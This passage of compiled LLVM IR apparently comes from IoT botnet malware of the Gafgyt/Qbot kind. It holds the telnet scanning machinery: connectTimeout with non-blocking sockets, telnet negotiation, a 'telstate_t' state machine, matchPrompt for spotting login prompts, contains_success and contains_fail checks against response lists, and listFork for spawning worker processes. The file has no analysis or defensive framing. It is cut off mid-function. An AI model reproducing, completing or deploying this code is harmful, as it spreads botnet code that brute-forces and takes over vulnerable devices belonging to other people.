  %9 = load i8**, i8*** %5, align 8
  %10 = load i32, i32* %6, align 4
  %11 = add nsw i32 %10, 1
  store i32 %11, i32* %6, align 4
  %12 = sext i32 %11 to i64
  %13 = getelementptr inbounds i8*, i8** %9, i64 %12
  %14 = load i8*, i8** %13, align 8
  %15 = icmp ne i8* %14, null
  br i1 %15, label %16, label %17

16:                                               ; preds = %8
  br label %8, !llvm.loop !32

17:                                               ; preds = %8
  store i32 0, i32* %7, align 4
  br label %18

18:                                               ; preds = %33, %17
  %19 = load i32, i32* %7, align 4
  %20 = load i32, i32* %6, align 4
  %21 = icmp slt i32 %19, %20
  br i1 %21, label %22, label %36

22:                                               ; preds = %18
  %23 = load i8*, i8** %4, align 8
  %24 = load i8**, i8*** %5, align 8
  %25 = load i32, i32* %7, align 4
  %26 = sext i32 %25 to i64
  %27 = getelementptr inbounds i8*, i8** %24, i64 %26
  %28 = load i8*, i8** %27, align 8
  %29 = call i8* @strcasestr(i8* noundef %23, i8* noundef %28) #11
  %30 = icmp ne i8* %29, null
  br i1 %30, label %31, label %32

31:                                               ; preds = %22
  store i32 1, i32* %3, align 4
  br label %37

32:                                               ; preds = %22
  br label %33

33:                                               ; preds = %32
  %34 = load i32, i32* %7, align 4
  %35 = add nsw i32 %34, 1
  store i32 %35, i32* %7, align 4
  br label %18, !llvm.loop !33

36:                                               ; preds = %18
  store i32 0, i32* %3, align 4
  br label %37

37:                                               ; preds = %36, %31
  %38 = load i32, i32* %3, align 4
  ret i32 %38
}

; Function Attrs: nounwind readonly willreturn
declare i8* @strcasestr(i8* noundef, i8* noundef) #1

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local i32 @read_with_timeout(i32 noundef %0, i32 noundef %1, i8* noundef %2, i32 noundef %3) #0 {
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i8*, align 8
  %9 = alloca i32, align 4
  %10 = alloca %struct.__sigset_t, align 8
  %11 = alloca %struct.timeval, align 8
  %12 = alloca i32, align 4
  %13 = alloca %struct.__sigset_t*, align 8
  store i32 %0, i32* %6, align 4
  store i32 %1, i32* %7, align 4
  store i8* %2, i8** %8, align 8
  store i32 %3, i32* %9, align 4
  %14 = getelementptr inbounds %struct.timeval, %struct.timeval* %11, i32 0, i32 0
  store i64 0, i64* %14, align 8
  %15 = load i32, i32* %7, align 4
  %16 = sext i32 %15 to i64
  %17 = getelementptr inbounds %struct.timeval, %struct.timeval* %11, i32 0, i32 1
  store i64 %16, i64* %17, align 8
  br label %18

18:                                               ; preds = %4
  store %struct.__sigset_t* %10, %struct.__sigset_t** %13, align 8
  store i32 0, i32* %12, align 4
  br label %19

19:                                               ; preds = %29, %18
  %20 = load i32, i32* %12, align 4
  %21 = zext i32 %20 to i64
  %22 = icmp ult i64 %21, 16
  br i1 %22, label %23, label %32

23:                                               ; preds = %19
  %24 = load %struct.__sigset_t*, %struct.__sigset_t** %13, align 8
  %25 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %24, i32 0, i32 0
  %26 = load i32, i32* %12, align 4
  %27 = zext i32 %26 to i64
  %28 = getelementptr inbounds [16 x i64], [16 x i64]* %25, i64 0, i64 %27
  store i64 0, i64* %28, align 8
  br label %29

29:                                               ; preds = %23
  %30 = load i32, i32* %12, align 4
  %31 = add i32 %30, 1
  store i32 %31, i32* %12, align 4
  br label %19, !llvm.loop !34

32:                                               ; preds = %19
  br label %33

33:                                               ; preds = %32
  %34 = load i32, i32* %6, align 4
  %35 = srem i32 %34, 64
  %36 = zext i32 %35 to i64
  %37 = shl i64 1, %36
  %38 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %10, i32 0, i32 0
  %39 = load i32, i32* %6, align 4
  %40 = sdiv i32 %39, 64
  %41 = sext i32 %40 to i64
  %42 = getelementptr inbounds [16 x i64], [16 x i64]* %38, i64 0, i64 %41
  %43 = load i64, i64* %42, align 8
  %44 = or i64 %43, %37
  store i64 %44, i64* %42, align 8
  %45 = load i32, i32* %6, align 4
  %46 = add nsw i32 %45, 1
  %47 = call i32 @select(i32 noundef %46, %struct.__sigset_t* noundef %10, %struct.__sigset_t* noundef null, %struct.__sigset_t* noundef null, %struct.timeval* noundef %11)
  %48 = icmp slt i32 %47, 1
  br i1 %48, label %49, label %50

49:                                               ; preds = %33
  store i32 0, i32* %5, align 4
  br label %57

50:                                               ; preds = %33
  %51 = load i32, i32* %6, align 4
  %52 = load i8*, i8** %8, align 8
  %53 = load i32, i32* %9, align 4
  %54 = sext i32 %53 to i64
  %55 = call i64 @recv(i32 noundef %51, i8* noundef %52, i64 noundef %54, i32 noundef 0)
  %56 = trunc i64 %55 to i32
  store i32 %56, i32* %5, align 4
  br label %57

57:                                               ; preds = %50, %49
  %58 = load i32, i32* %5, align 4
  ret i32 %58
}

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local i32 @read_until_response(i32 noundef %0, i32 noundef %1, i8* noundef %2, i32 noundef %3, i8** noundef %4) #0 {
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i8*, align 8
  %10 = alloca i32, align 4
  %11 = alloca i8**, align 8
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  store i32 %0, i32* %7, align 4
  store i32 %1, i32* %8, align 4
  store i8* %2, i8** %9, align 8
  store i32 %3, i32* %10, align 4
  store i8** %4, i8*** %11, align 8
  %14 = load i8*, i8** %9, align 8
  %15 = load i32, i32* %10, align 4
  %16 = sext i32 %15 to i64
  call void @llvm.memset.p0i8.i64(i8* align 1 %14, i8 0, i64 %16, i1 false)
  %17 = load i32, i32* %7, align 4
  %18 = load i32, i32* %8, align 4
  %19 = load i8*, i8** %9, align 8
  %20 = load i32, i32* %10, align 4
  %21 = call i32 @read_with_timeout(i32 noundef %17, i32 noundef %18, i8* noundef %19, i32 noundef %20)
  store i32 %21, i32* %12, align 4
  %22 = load i8*, i8** %9, align 8
  %23 = getelementptr inbounds i8, i8* %22, i64 0
  %24 = load i8, i8* %23, align 1
  %25 = sext i8 %24 to i32
  %26 = icmp eq i32 %25, 255
  br i1 %26, label %27, label %31

27:                                               ; preds = %5
  %28 = load i32, i32* %7, align 4
  %29 = load i8*, i8** %9, align 8
  %30 = call i32 @negotiate(i32 noundef %28, i8* noundef %29, i32 noundef 3)
  br label %31

31:                                               ; preds = %27, %5
  %32 = load i8*, i8** %9, align 8
  %33 = load i8**, i8*** %11, align 8
  %34 = call i32 @contains_string(i8* noundef %32, i8** noundef %33)
  %35 = icmp ne i32 %34, 0
  br i1 %35, label %36, label %37

36:                                               ; preds = %31
  store i32 1, i32* %6, align 4
  br label %38

37:                                               ; preds = %31
  store i32 0, i32* %6, align 4
  br label %38

38:                                               ; preds = %37, %36
  %39 = load i32, i32* %6, align 4
  ret i32 %39
}

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local void @advance_state(%struct.telstate_t* noundef %0, i32 noundef %1) #0 {
  %3 = alloca %struct.telstate_t*, align 8
  %4 = alloca i32, align 4
  store %struct.telstate_t* %0, %struct.telstate_t** %3, align 8
  store i32 %1, i32* %4, align 4
  %5 = load i32, i32* %4, align 4
  %6 = icmp eq i32 %5, 0
  br i1 %6, label %7, label %12

7:                                                ; preds = %2
  %8 = load %struct.telstate_t*, %struct.telstate_t** %3, align 8
  %9 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %8, i32 0, i32 0
  %10 = load i32, i32* %9, align 8
  %11 = call i32 @close(i32 noundef %10)
  br label %12

12:                                               ; preds = %7, %2
  %13 = load %struct.telstate_t*, %struct.telstate_t** %3, align 8
  %14 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %13, i32 0, i32 7
  store i32 0, i32* %14, align 8
  %15 = load i32, i32* %4, align 4
  %16 = trunc i32 %15 to i8
  %17 = load %struct.telstate_t*, %struct.telstate_t** %3, align 8
  %18 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i32 0, i32 2
  store i8 %16, i8* %18, align 8
  %19 = load %struct.telstate_t*, %struct.telstate_t** %3, align 8
  %20 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %19, i32 0, i32 9
  %21 = load i8*, i8** %20, align 8
  call void @llvm.memset.p0i8.i64(i8* align 1 %21, i8 0, i64 1024, i1 false)
  ret void
}

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local void @reset_telstate(%struct.telstate_t* noundef %0) #0 {
  %2 = alloca %struct.telstate_t*, align 8
  store %struct.telstate_t* %0, %struct.telstate_t** %2, align 8
  %3 = load %struct.telstate_t*, %struct.telstate_t** %2, align 8
  call void @advance_state(%struct.telstate_t* noundef %3, i32 noundef 0)
  %4 = load %struct.telstate_t*, %struct.telstate_t** %2, align 8
  %5 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %4, i32 0, i32 3
  store i8 1, i8* %5, align 1
  ret void
}

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local i32 @contains_success(i8* noundef %0) #0 {
  %2 = alloca i8*, align 8
  store i8* %0, i8** %2, align 8
  %3 = load i8*, i8** %2, align 8
  %4 = call i32 @contains_string(i8* noundef %3, i8** noundef getelementptr inbounds ([8 x i8*], [8 x i8*]* @successes, i64 0, i64 0))
  ret i32 %4
}

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local i32 @contains_fail(i8* noundef %0) #0 {
  %2 = alloca i8*, align 8
  store i8* %0, i8** %2, align 8
  %3 = load i8*, i8** %2, align 8
  %4 = call i32 @contains_string(i8* noundef %3, i8** noundef getelementptr inbounds ([9 x i8*], [9 x i8*]* @fails, i64 0, i64 0))
  ret i32 %4
}

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local i32 @contains_response(i8* noundef %0) #0 {
  %2 = alloca i8*, align 8
  store i8* %0, i8** %2, align 8
  %3 = load i8*, i8** %2, align 8
  %4 = call i32 @contains_success(i8* noundef %3)
  %5 = icmp ne i32 %4, 0
  br i1 %5, label %10, label %6

6:                                                ; preds = %1
  %7 = load i8*, i8** %2, align 8
  %8 = call i32 @contains_fail(i8* noundef %7)
  %9 = icmp ne i32 %8, 0
  br label %10

10:                                               ; preds = %6, %1
  %11 = phi i1 [ true, %1 ], [ %9, %6 ]
  %12 = zext i1 %11 to i32
  ret i32 %12
}

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local i32 @connectTimeout(i32 noundef %0, i8* noundef %1, i32 noundef %2, i32 noundef %3) #0 {
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i8*, align 8
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca %struct.sockaddr_in, align 4
  %11 = alloca %struct.__sigset_t, align 8
  %12 = alloca %struct.timeval, align 8
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i64, align 8
  %16 = alloca i32, align 4
  %17 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %18 = alloca i32, align 4
  %19 = alloca %struct.__sigset_t*, align 8
  store i32 %0, i32* %6, align 4
  store i8* %1, i8** %7, align 8
  store i32 %2, i32* %8, align 4
  store i32 %3, i32* %9, align 4
  %20 = load i32, i32* %6, align 4
  %21 = call i32 (i32, i32, ...) @fcntl(i32 noundef %20, i32 noundef 3, i8* noundef null)
  %22 = sext i32 %21 to i64
  store i64 %22, i64* %15, align 8
  %23 = load i64, i64* %15, align 8
  %24 = or i64 %23, 2048
  store i64 %24, i64* %15, align 8
  %25 = load i32, i32* %6, align 4
  %26 = load i64, i64* %15, align 8
  %27 = call i32 (i32, i32, ...) @fcntl(i32 noundef %25, i32 noundef 4, i64 noundef %26)
  %28 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 0
  store i16 2, i16* %28, align 4
  %29 = load i32, i32* %8, align 4
  %30 = trunc i32 %29 to i16
  %31 = call zeroext i16 @htons(i16 noundef zeroext %30) #15
  %32 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 1
  store i16 %31, i16* %32, align 2
  %33 = load i8*, i8** %7, align 8
  %34 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 2
  %35 = call i32 @getHost(i8* noundef %33, %struct.in_addr* noundef %34)
  %36 = icmp ne i32 %35, 0
  br i1 %36, label %37, label %38

37:                                               ; preds = %4
  store i32 0, i32* %5, align 4
  br label %110

38:                                               ; preds = %4
  %39 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 3
  %40 = getelementptr inbounds [8 x i8], [8 x i8]* %39, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 4 %40, i8 0, i64 8, i1 false)
  %41 = load i32, i32* %6, align 4
  %42 = bitcast %union.__CONST_SOCKADDR_ARG* %17 to %struct.sockaddr**
  %43 = bitcast %struct.sockaddr_in* %10 to %struct.sockaddr*
  store %struct.sockaddr* %43, %struct.sockaddr** %42, align 8
  %44 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %17, i32 0, i32 0
  %45 = load %struct.sockaddr*, %struct.sockaddr** %44, align 8
  %46 = call i32 @connect(i32 noundef %41, %struct.sockaddr* %45, i32 noundef 16)
  store i32 %46, i32* %16, align 4
  %47 = load i32, i32* %16, align 4
  %48 = icmp slt i32 %47, 0
  br i1 %48, label %49, label %101

49:                                               ; preds = %38
  %50 = call i32* @__errno_location() #15
  %51 = load i32, i32* %50, align 4
  %52 = icmp eq i32 %51, 115
  br i1 %52, label %53, label %99

53:                                               ; preds = %49
  %54 = load i32, i32* %9, align 4
  %55 = sext i32 %54 to i64
  %56 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 0
  store i64 %55, i64* %56, align 8
  %57 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 1
  store i64 0, i64* %57, align 8
  br label %58

58:                                               ; preds = %53
  store %struct.__sigset_t* %11, %struct.__sigset_t** %19, align 8
  store i32 0, i32* %18, align 4
  br label %59

59:                                               ; preds = %69, %58
  %60 = load i32, i32* %18, align 4
  %61 = zext i32 %60 to i64
  %62 = icmp ult i64 %61, 16
  br i1 %62, label %63, label %72

63:                                               ; preds = %59
  %64 = load %struct.__sigset_t*, %struct.__sigset_t** %19, align 8
  %65 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %64, i32 0, i32 0
  %66 = load i32, i32* %18, align 4
  %67 = zext i32 %66 to i64
  %68 = getelementptr inbounds [16 x i64], [16 x i64]* %65, i64 0, i64 %67
  store i64 0, i64* %68, align 8
  br label %69

69:                                               ; preds = %63
  %70 = load i32, i32* %18, align 4
  %71 = add i32 %70, 1
  store i32 %71, i32* %18, align 4
  br label %59, !llvm.loop !35

72:                                               ; preds = %59
  br label %73

73:                                               ; preds = %72
  %74 = load i32, i32* %6, align 4
  %75 = srem i32 %74, 64
  %76 = zext i32 %75 to i64
  %77 = shl i64 1, %76
  %78 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %11, i32 0, i32 0
  %79 = load i32, i32* %6, align 4
  %80 = sdiv i32 %79, 64
  %81 = sext i32 %80 to i64
  %82 = getelementptr inbounds [16 x i64], [16 x i64]* %78, i64 0, i64 %81
  %83 = load i64, i64* %82, align 8
  %84 = or i64 %83, %77
  store i64 %84, i64* %82, align 8
  %85 = load i32, i32* %6, align 4
  %86 = add nsw i32 %85, 1
  %87 = call i32 @select(i32 noundef %86, %struct.__sigset_t* noundef null, %struct.__sigset_t* noundef %11, %struct.__sigset_t* noundef null, %struct.timeval* noundef %12)
  %88 = icmp sgt i32 %87, 0
  br i1 %88, label %89, label %97

89:                                               ; preds = %73
  store i32 4, i32* %13, align 4
  %90 = load i32, i32* %6, align 4
  %91 = bitcast i32* %14 to i8*
  %92 = call i32 @getsockopt(i32 noundef %90, i32 noundef 1, i32 noundef 4, i8* noundef %91, i32* noundef %13) #12
  %93 = load i32, i32* %14, align 4
  %94 = icmp ne i32 %93, 0
  br i1 %94, label %95, label %96

95:                                               ; preds = %89
  store i32 0, i32* %5, align 4
  br label %110

96:                                               ; preds = %89
  br label %98

97:                                               ; preds = %73
  store i32 0, i32* %5, align 4
  br label %110

98:                                               ; preds = %96
  br label %100

99:                                               ; preds = %49
  store i32 0, i32* %5, align 4
  br label %110

100:                                              ; preds = %98
  br label %101

101:                                              ; preds = %100, %38
  %102 = load i32, i32* %6, align 4
  %103 = call i32 (i32, i32, ...) @fcntl(i32 noundef %102, i32 noundef 3, i8* noundef null)
  %104 = sext i32 %103 to i64
  store i64 %104, i64* %15, align 8
  %105 = load i64, i64* %15, align 8
  %106 = and i64 %105, -2049
  store i64 %106, i64* %15, align 8
  %107 = load i32, i32* %6, align 4
  %108 = load i64, i64* %15, align 8
  %109 = call i32 (i32, i32, ...) @fcntl(i32 noundef %107, i32 noundef 4, i64 noundef %108)
  store i32 1, i32* %5, align 4
  br label %110

110:                                              ; preds = %101, %99, %97, %95, %37
  %111 = load i32, i32* %5, align 4
  ret i32 %111
}

declare i32 @fcntl(i32 noundef, i32 noundef, ...) #3

; Function Attrs: nounwind readnone willreturn
declare zeroext i16 @htons(i16 noundef zeroext) #8

declare i32 @connect(i32 noundef, %struct.sockaddr*, i32 noundef) #3

; Function Attrs: nounwind
declare i32 @getsockopt(i32 noundef, i32 noundef, i32 noundef, i8* noundef, i32* noundef) #4

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local i32 @listFork() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca i32*, align 8
  %4 = alloca i32, align 4
  %5 = call i32 @fork() #12
  store i32 %5, i32* %2, align 4
  %6 = load i32, i32* %2, align 4
  %7 = icmp sle i32 %6, 0
  br i1 %7, label %8, label %10

8:                                                ; preds = %0
  %9 = load i32, i32* %2, align 4
  store i32 %9, i32* %1, align 4
  br label %48

10:                                               ; preds = %0
  %11 = load i32, i32* @numpids, align 4
  %12 = add nsw i32 %11, 1
  store i32 %12, i32* @numpids, align 4
  %13 = load i32, i32* @numpids, align 4
  %14 = add nsw i32 %13, 1
  %15 = mul nsw i32 %14, 4
  %16 = sext i32 %15 to i64
  %17 = call noalias i8* @malloc(i64 noundef %16) #12
  %18 = bitcast i8* %17 to i32*
  store i32* %18, i32** %3, align 8
  store i32 0, i32* %4, align 4
  br label %19

19:                                               ; preds = %34, %10
  %20 = load i32, i32* %4, align 4
  %21 = load i32, i32* @numpids, align 4
  %22 = sub nsw i32 %21, 1
  %23 = icmp slt i32 %20, %22
  br i1 %23, label %24, label %37

24:                                               ; preds = %19
  %25 = load i32*, i32** @pids, align 8
  %26 = load i32, i32* %4, align 4
  %27 = sext i32 %26 to i64
  %28 = getelementptr inbounds i32, i32* %25, i64 %27
  %29 = load i32, i32* %28, align 4
  %30 = load i32*, i32** %3, align 8
  %31 = load i32, i32* %4, align 4
  %32 = sext i32 %31 to i64
  %33 = getelementptr inbounds i32, i32* %30, i64 %32
  store i32 %29, i32* %33, align 4
  br label %34

34:                                               ; preds = %24
  %35 = load i32, i32* %4, align 4
  %36 = add nsw i32 %35, 1
  store i32 %36, i32* %4, align 4
  br label %19, !llvm.loop !36

37:                                               ; preds = %19
  %38 = load i32, i32* %2, align 4
  %39 = load i32*, i32** %3, align 8
  %40 = load i32, i32* @numpids, align 4
  %41 = sub nsw i32 %40, 1
  %42 = sext i32 %41 to i64
  %43 = getelementptr inbounds i32, i32* %39, i64 %42
  store i32 %38, i32* %43, align 4
  %44 = load i32*, i32** @pids, align 8
  %45 = bitcast i32* %44 to i8*
  call void @free(i8* noundef %45) #12
  %46 = load i32*, i32** %3, align 8
  store i32* %46, i32** @pids, align 8
  %47 = load i32, i32* %2, align 4
  store i32 %47, i32* %1, align 4
  br label %48

48:                                               ; preds = %37, %8
  %49 = load i32, i32* %1, align 4
  ret i32 %49
}

; Function Attrs: nounwind
declare i32 @fork() #4

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local i32 @matchPrompt(i8* noundef %0) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i8*, align 8
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  store i8* %0, i8** %3, align 8
  store i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.310, i64 0, i64 0), i8** %4, align 8
  %8 = load i8*, i8** %3, align 8
  %9 = call i64 @strlen(i8* noundef %8) #11
  %10 = trunc i64 %9 to i32
  store i32 %10, i32* %5, align 4
  store i32 0, i32* %7, align 4
  store i32 0, i32* %6, align 4
  br label %11

11:                                               ; preds = %97, %1
  %12 = load i32, i32* %6, align 4
  %13 = sext i32 %12 to i64
  %14 = load i8*, i8** %4, align 8
  %15 = call i64 @strlen(i8* noundef %14) #11
  %16 = icmp ult i64 %13, %15
  br i1 %16, label %17, label %100

17:                                               ; preds = %11
  br label %18

18:                                               ; preds = %74, %17
  %19 = load i32, i32* %5, align 4
  %20 = load i32, i32* %7, align 4
  %21 = icmp sgt i32 %19, %20
  br i1 %21, label %22, label %72

22:                                               ; preds = %18
  %23 = load i8*, i8** %3, align 8
  %24 = load i32, i32* %5, align 4
  %25 = sext i32 %24 to i64
  %26 = getelementptr inbounds i8, i8* %23, i64 %25
  %27 = load i32, i32* %7, align 4
  %28 = sext i32 %27 to i64
  %29 = sub i64 0, %28
  %30 = getelementptr inbounds i8, i8* %26, i64 %29
  %31 = load i8, i8* %30, align 1
  %32 = sext i8 %31 to i32
  %33 = icmp eq i32 %32, 0
  br i1 %33, label %70, label %34

34:                                               ; preds = %22
  %35 = load i8*, i8** %3, align 8
  %36 = load i32, i32* %5, align 4
  %37 = sext i32 %36 to i64
  %38 = getelementptr inbounds i8, i8* %35, i64 %37
  %39 = load i32, i32* %7, align 4
  %40 = sext i32 %39 to i64
  %41 = sub i64 0, %40
  %42 = getelementptr inbounds i8, i8* %38, i64 %41
  %43 = load i8, i8* %42, align 1
  %44 = sext i8 %43 to i32
  %45 = icmp eq i32 %44, 32
  br i1 %45, label %70, label %46

46:                                               ; preds = %34
  %47 = load i8*, i8** %3, align 8
  %48 = load i32, i32* %5, align 4
  %49 = sext i32 %48 to i64
  %50 = getelementptr inbounds i8, i8* %47, i64 %49
  %51 = load i32, i32* %7, align 4
  %52 = sext i32 %51 to i64
  %53 = sub i64 0, %52
  %54 = getelementptr inbounds i8, i8* %50, i64 %53
  %55 = load i8, i8* %54, align 1
  %56 = sext i8 %55 to i32
  %57 = icmp eq i32 %56, 13
  br i1 %57, label %70, label %58

58:                                               ; preds = %46
  %59 = load i8*, i8** %3, align 8
  %60 = load i32, i32* %5, align 4
  %61 = sext i32 %60 to i64
  %62 = getelementptr inbounds i8, i8* %59, i64 %61
  %63 = load i32, i32* %7, align 4
  %64 = sext i32 %63 to i64
  %65 = sub i64 0, %64
  %66 = getelementptr inbounds i8, i8* %62, i64 %65
  %67 = load i8, i8* %66, align 1
  %68 = sext i8 %67 to i32
  %69 = icmp eq i32 %68, 10
  br label %70

70:                                               ; preds = %58, %46, %34, %22
  %71 = phi i1 [ true, %46 ], [ true, %34 ], [ true, %22 ], [ %69, %58 ]
  br label %72

72:                                               ; preds = %70, %18
  %73 = phi i1 [ false, %18 ], [ %71, %70 ]
  br i1 %73, label %74, label %77

74:                                               ; preds = %72
  %75 = load i32, i32* %7, align 4
  %76 = add nsw i32 %75, 1
  store i32 %76, i32* %7, align 4
  br label %18, !llvm.loop !37

77:                                               ; preds = %72
  %78 = load i8*, i8** %3, align 8
  %79 = load i32, i32* %5, align 4
  %80 = sext i32 %79 to i64
  %81 = getelementptr inbounds i8, i8* %78, i64 %80
  %82 = load i32, i32* %7, align 4
  %83 = sext i32 %82 to i64
  %84 = sub i64 0, %83
  %85 = getelementptr inbounds i8, i8* %81, i64 %84
  %86 = load i8, i8* %85, align 1
  %87 = sext i8 %86 to i32
  %88 = load i8*, i8** %4, align 8
  %89 = load i32, i32* %6, align 4
  %90 = sext i32 %89 to i64
  %91 = getelementptr inbounds i8, i8* %88, i64 %90
  %92 = load i8, i8* %91, align 1
  %93 = sext i8 %92 to i32
  %94 = icmp eq i32 %87, %93
  br i1 %94, label %95, label %96

95:                                               ; preds = %77
  store i32 1, i32* %2, align 4
  br label %101

96:                                               ; preds = %77
  br label %97

97:                                               ; preds = %96
  %98 = load i32, i32* %6, align 4
  %99 = add nsw i32 %98, 1
  store i32 %99, i32* %6, align 4
  br label %11, !llvm.loop !38

100:                                              ; preds = %11
  store i32 0, i32* %2, align 4
  br label %101

101:                                              ; preds = %100, %95
  %102 = load i32, i32* %2, align 4
  ret i32 %102
}

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local i32 @readUntil(i32 noundef %0, i8* noundef %1, i32 noundef %2, i32 noundef %3, i32 noundef %4, i8* noundef %5, i32 noundef %6, i32 noundef %7) #0 {
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i8*, align 8
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i8*, align 8
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca %struct.__sigset_t, align 8
  %22 = alloca %struct.timeval, align 8
  %23 = alloca i8*, align 8
  %24 = alloca i32, align 4
  %25 = alloca %struct.__sigset_t*, align 8
  store i32 %0, i32* %10, align 4
  store i8* %1, i8** %11, align 8
  store i32 %2, i32* %12, align 4
  store i32 %3, i32* %13, align 4
  store i32 %4, i32* %14, align 4
  store i8* %5, i8** %15, align 8
  store i32 %6, i32* %16, align 4
  store i32 %7, i32* %17, align 4
  %26 = load i32, i32* %17, align 4
  store i32 %26, i32* %18, align 4
  store i32 0, i32* %19, align 4
  store i32 0, i32* %20, align 4
  %27 = load i32, i32* %13, align 4
  %28 = sext i32 %27 to i64
  %29 = getelementptr inbounds %struct.timeval, %struct.timeval* %22, i32 0, i32 0
  store i64 %28, i64* %29, align 8
  %30 = load i32, i32* %14, align 4
  %31 = sext i32 %30 to i64
  %32 = getelementptr inbounds %struct.timeval, %struct.timeval* %22, i32 0, i32 1
  store i64 %31, i64* %32, align 8
  store i8* null, i8** %23, align 8
  br label %33

33:                                               ; preds = %142, %8
  %34 = load i32, i32* %18, align 4
  %35 = add nsw i32 %34, 2
  %36 = load i32, i32* %16, align 4
  %37 = icmp slt i32 %35, %36
  br i1 %37, label %38, label %48

38:                                               ; preds = %33
  %39 = getelementptr inbounds %struct.timeval, %struct.timeval* %22, i32 0, i32 0
  %40 = load i64, i64* %39, align 8
  %41 = icmp sgt i64 %40, 0
  br i1 %41, label %46, label %42

42:                                               ; preds = %38
  %43 = getelementptr inbounds %struct.timeval, %struct.timeval* %22, i32 0, i32 1
  %44 = load i64, i64* %43, align 8
  %45 = icmp sgt i64 %44, 0
  br label %46

46:                                               ; preds = %42, %38
  %47 = phi i1 [ true, %38 ], [ %45, %42 ]
  br label %48

48:                                               ; preds = %46, %33
  %49 = phi i1 [ false, %33 ], [ %47, %46 ]
  br i1 %49, label %50, label %143

50:                                               ; preds = %48
  br label %51

51:                                               ; preds = %50
  store %struct.__sigset_t* %21, %struct.__sigset_t** %25, align 8
  store i32 0, i32* %24, align 4
  br label %52

52:                                               ; preds = %62, %51
  %53 = load i32, i32* %24, align 4
  %54 = zext i32 %53 to i64
  %55 = icmp ult i64 %54, 16
  br i1 %55, label %56, label %65

56:                                               ; preds = %52
  %57 = load %struct.__sigset_t*, %struct.__sigset_t** %25, align 8
  %58 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %57, i32 0, i32 0
  %59 = load i32, i32* %24, align 4
  %60 = zext i32 %59 to i64
  %61 = getelementptr inbounds [16 x i64], [16 x i64]* %58, i64 0, i64 %60
  store i64 0, i64* %61, align 8
  br label %62

62:                                               ; preds = %56
  %63 = load i32, i32* %24, align 4
  %64 = add i32 %63, 1
  store i32 %64, i32* %24, align 4
  br label %52, !llvm.loop !39

65:                                               ; preds = %52
  br label %66

66:                                               ; preds = %65
  %67 = load i32, i32* %10, align 4
  %68 = srem i32 %67, 64
  %69 = zext i32 %68 to i64
  %70 = shl i64 1, %69
  %71 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %21, i32 0, i32 0
  %72 = load i32, i32* %10, align 4
  %73 = sdiv i32 %72, 64
  %74 = sext i32 %73 to i64
  %75 = getelementptr inbounds [16 x i64], [16 x i64]* %71, i64 0, i64 %74
  %76 = load i64, i64* %75, align 8
  %77 = or i64 %76, %70
  store i64 %77, i64* %75, align 8
  %78 = load i32, i32* %10, align 4
  %79 = add nsw i32 %78, 1
  %80 = call i32 @select(i32 noundef %79, %struct.__sigset_t* noundef %21, %struct.__sigset_t* noundef null, %struct.__sigset_t* noundef null, %struct.timeval* noundef %22)
  %81 = icmp slt i32 %80, 1
  br i1 %81, label %82, label %83

82:                                               ; preds = %66
  br label %143

83:                                               ; preds = %66
  %84 = load i8*, i8** %15, align 8
  %85 = load i32, i32* %18, align 4
  %86 = sext i32 %85 to i64
  %87 = getelementptr inbounds i8, i8* %84, i64 %86
  store i8* %87, i8** %23, align 8
  %88 = load i32, i32* %10, align 4
  %89 = load i8*, i8** %23, align 8
  %90 = call i64 @recv(i32 noundef %88, i8* noundef %89, i64 noundef 1, i32 noundef 0)
  %91 = trunc i64 %90 to i32
  store i32 %91, i32* %19, align 4
  %92 = load i32, i32* %19, align 4
  %93 = icmp eq i32 %92, -1
  br i1 %93, label %97, label %94

94:                                               ; preds = %83
  %95 = load i32, i32* %19, align 4
  %96 = icmp eq i32 %95, 0
